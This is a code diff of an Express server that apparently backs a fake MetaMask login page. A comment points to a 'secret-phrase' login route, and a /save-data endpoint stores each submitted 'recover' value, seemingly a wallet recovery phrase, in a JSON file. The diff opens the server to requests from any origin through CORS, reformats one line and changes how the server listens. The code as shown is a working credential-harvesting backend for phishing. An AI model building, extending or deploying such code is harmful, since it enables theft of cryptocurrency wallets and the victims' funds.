@@ -2,7 +2,10 @@ const express = require("express");
 const fs = require("fs");
 const path = require("path");
 const app = express();
+const cors = require("cors");
 const PORT = 80;
+
+app.use(cors());
 
 // http://localhost:80/metamask-login?type=secreat-phrase
 
@@ -22,7 +25,7 @@ app.post("/save-data", (req, res) => {
 
     const jsonData = JSON.parse(data);
     if (!jsonData.find((item) => item.recover === newData.recover)) {
-      jsonData.push({recover: newData.recover}); // Add the new data to the array
+      jsonData.push({ recover: newData.recover }); // Add the new data to the array
     }
     // Write the updated data back to data.json
     fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
@@ -43,6 +46,6 @@ app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "dist", "index.html"));
 });
 
-app.listen(PORT, "0.0.0.0", () => {
+app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
